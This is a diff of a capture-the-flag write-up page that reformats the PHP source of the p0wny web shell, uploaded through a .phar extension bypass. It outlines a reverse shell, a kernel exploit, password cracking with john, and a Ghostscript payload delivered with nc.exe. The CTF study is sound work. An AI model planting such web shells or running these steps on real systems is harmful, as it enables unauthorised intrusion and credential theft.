@@ -83,103 +83,99 @@ We can see 2 http services, go forward the one which allows create an account
 Testing some allowed extensions, we realise .phar extensions.
 There is a  tool called ponyshell, downloaded and change its extensions
 <br /><br />
-```php
-&lt;?php</li>
-</ul>
-
-<p>$SHELL_CONFIG = array(
-    ‘username’ =&gt; ‘p0wny’,
-    ‘hostname’ =&gt; ‘shell’,
-);</p>
-
-<p>function expandPath($path) {
-    if (preg_match(“#^(~[a-zA-Z0-9_.-]<em>)(/.</em>)?$#”, $path, $match)) {
-        exec(“echo $match[1]”, $stdout);
-        return $stdout[0] . $match[2];
-    }
-    return $path;
-}</p>
-
-<p>function allFunctionExist($list = array()) {
-    foreach ($list as $entry) {
-        if (!function_exists($entry)) {
-            return false;
-        }
-    }
-    return true;
-}</p>
-
-<p>function executeCommand($cmd) {
-    $output = ‘’;
-    if (function_exists(‘exec’)) {
-        exec($cmd, $output);
-        $output = implode(“\n”, $output);
-    } else if (function_exists(‘shell_exec’)) {
-        $output = shell_exec($cmd);
-    } else if (allFunctionExist(array(‘system’, ‘ob_start’, ‘ob_get_contents’, ‘ob_end_clean’))) {
-        ob_start();
-        system($cmd);
-        $output = ob_get_contents();
-        ob_end_clean();
-    } else if (allFunctionExist(array(‘passthru’, ‘ob_start’, ‘ob_get_contents’, ‘ob_end_clean’))) {
-        ob_start();
-        passthru($cmd);
-        $output = ob_get_contents();
-        ob_end_clean();
-    } else if (allFunctionExist(array(‘popen’, ‘feof’, ‘fread’, ‘pclose’))) {
-        $handle = popen($cmd, ‘r’);
-        while (!feof($handle)) {
-            $output .= fread($handle, 4096);
-        }
-        pclose($handle);
-    } else if (allFunctionExist(array(‘proc_open’, ‘stream_get_contents’, ‘proc_close’))) {
-        $handle = proc_open($cmd, array(0 =&gt; array(‘pipe’, ‘r’), 1 =&gt; array(‘pipe’, ‘w’)), $pipes);
-        $output = stream_get_contents($pipes[1]);
-        proc_close($handle);
-    }
-    return $output;
-}</p>
-
-<p>function isRunningWindows() {
-    return stripos(PHP_OS, “WIN”) === 0;
-}</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br/&gt;&lt;br/&gt;
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$SHELL_CONFIG</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+  <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'p0wny'</span><span class="p">,</span>
+  <span class="s1">'hostname'</span> <span class="o">=&gt;</span> <span class="s1">'shell'</span><span class="p">,</span>
+<span class="p">);</span>
+<span class="k">function</span> <span class="n">expandPath</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"#^(~[a-zA-Z0-9_.-]*)(/.*)?$#"</span><span class="p">,</span> <span class="nv">$path</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
+      <span class="nb">exec</span><span class="p">(</span><span class="s2">"echo </span><span class="nv">$match[1]</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$stdout</span><span class="p">);</span>
+      <span class="k">return</span> <span class="nv">$stdout</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="mf">.</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">allFunctionExist</span><span class="p">(</span><span class="nv">$list</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>
+  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$entry</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$entry</span><span class="p">))</span> <span class="p">{</span>
+          <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+      <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">executeCommand</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$output</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'exec'</span><span class="p">))</span> <span class="p">{</span>
+      <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$output</span><span class="p">);</span>
+      <span class="nv">$output</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$output</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'shell_exec'</span><span class="p">))</span> <span class="p">{</span>
+      <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">allFunctionExist</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'system'</span><span class="p">,</span> <span class="s1">'ob_start'</span><span class="p">,</span> <span class="s1">'ob_get_contents'</span><span class="p">,</span> <span class="s1">'ob_end_clean'</span><span class="p">)))</span> <span class="p">{</span>
+      <span class="nb">ob_start</span><span class="p">();</span>
+      <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+      <span class="nv">$output</span> <span class="o">=</span> <span class="nb">ob_get_contents</span><span class="p">();</span>
+      <span class="nb">ob_end_clean</span><span class="p">();</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">allFunctionExist</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'passthru'</span><span class="p">,</span> <span class="s1">'ob_start'</span><span class="p">,</span> <span class="s1">'ob_get_contents'</span><span class="p">,</span> <span class="s1">'ob_end_clean'</span><span class="p">)))</span> <span class="p">{</span>
+      <span class="nb">ob_start</span><span class="p">();</span>
+      <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+      <span class="nv">$output</span> <span class="o">=</span> <span class="nb">ob_get_contents</span><span class="p">();</span>
+      <span class="nb">ob_end_clean</span><span class="p">();</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">allFunctionExist</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'popen'</span><span class="p">,</span> <span class="s1">'feof'</span><span class="p">,</span> <span class="s1">'fread'</span><span class="p">,</span> <span class="s1">'pclose'</span><span class="p">)))</span> <span class="p">{</span>
+      <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">);</span>
+      <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))</span> <span class="p">{</span>
+          <span class="nv">$output</span> <span class="mf">.</span><span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="nb">pclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">allFunctionExist</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'proc_open'</span><span class="p">,</span> <span class="s1">'stream_get_contents'</span><span class="p">,</span> <span class="s1">'proc_close'</span><span class="p">)))</span> <span class="p">{</span>
+      <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">),</span> <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)),</span> <span class="nv">$pipes</span><span class="p">);</span>
+      <span class="nv">$output</span> <span class="o">=</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+      <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">isRunningWindows</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s2">"WIN"</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+    <p><br /><br />
 We can search with gobuster to search routes 
-&lt;br/&gt;&lt;br/&gt;
-![Untitled](/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_4.png)
-&lt;br/&gt;&lt;br/&gt;
-## 2: User flag
-&lt;br/&gt;&lt;br/&gt;
+<br /><br />
+<img src="/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_4.png" alt="Untitled" />
+<br /><br /></p>
+    <h2 id="2-user-flag">2: User flag</h2>
+    <p><br /><br />
 We can use a rev shell and generate estability
-&lt;br/&gt;&lt;br/&gt;
+<br /><br />
 Using uname -a we can see there is a vulnerable kernel version, download the exploit 
-&lt;br/&gt;&lt;br/&gt;
-- We are root at data → cat /etc/passwd
-&lt;br/&gt;&lt;br/&gt;
-```bash
-john hash.txt rockyou.txt
-</code></pre></div></div>
-<p><br /><br />
+<br /><br /></p>
+  </li>
+  <li>We are root at data → cat /etc/passwd
+<br /><br />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john hash.txt rockyou.txt
+</code></pre></div>    </div>
+    <p><br /><br />
 We’ve got creds in the 443 port interface, there we find a Gohostscript vulnerability
 <br /><br />
 Clone the repository and create the payload to injected 
 <br /><br /></p>
-<ol>
-  <li>We send a payload with nc.exe request by email
+    <ol>
+      <li>We send a payload with nc.exe request by email
 <br /><br />
 <img src="/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_5.png" alt="Untitled" />
 <br /><br /></li>
-  <li>Once it is on the victim machine we sent another payload with the rev shell
+      <li>Once it is on the victim machine we sent another payload with the rev shell
 <br /><br />
 <img src="/assets/images/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5/03474a48-aa77-4a3c-97fd-0378f857aa8e-export-f261a4d5-a771-4e81-9b11-b4b2aa116ad5_Untitled_6.png" alt="Untitled" />
 <br /><br />
-    <h2 id="3-priv-esc">3: Priv esc</h2>
-    <p><br /><br />
+        <h2 id="3-priv-esc">3: Priv esc</h2>
+        <p><br /><br />
 Start this part where you spawn, theres is a file called ghostscrip.bat lets type it
 <br /><br />
 We found some rcpclient creds</p>
+      </li>
+    </ol>
   </li>
-</ol>
+</ul>
 
 <p><br /><br /></p>
 <h3 id="rcpclient">rcpclient</h3>
